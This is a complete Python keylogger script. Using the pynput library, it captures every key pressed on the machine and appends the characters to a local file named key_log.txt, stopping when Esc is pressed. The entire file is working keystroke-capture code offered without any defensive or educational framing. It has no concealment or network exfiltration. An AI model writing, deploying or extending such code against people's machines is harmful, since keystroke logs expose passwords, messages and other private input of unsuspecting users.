from pynput import keyboard

class KeyLogger:
    def __init__(self, filename: str = "key_log.txt") -> None:
        self.filename = filename

    @staticmethod
    def get_char(key):
        try:
            return key.char
        except AttributeError:
            if key == keyboard.Key.space:
                return ' '
            elif key == keyboard.Key.enter:
                return '\n'
            elif key == keyboard.Key.tab:
                return '\t'
            else:
                return str(key)

    def on_press(self, key):
        with open(self.filename, 'a') as logs:
            logs.write(self.get_char(key))

    def on_release(self, key):
        if key == keyboard.Key.esc:
            return False

    def main(self):
        listener = keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        )
        listener.start()
        listener.join()

if __name__ == '__main__':
    logger = KeyLogger()
    logger.main()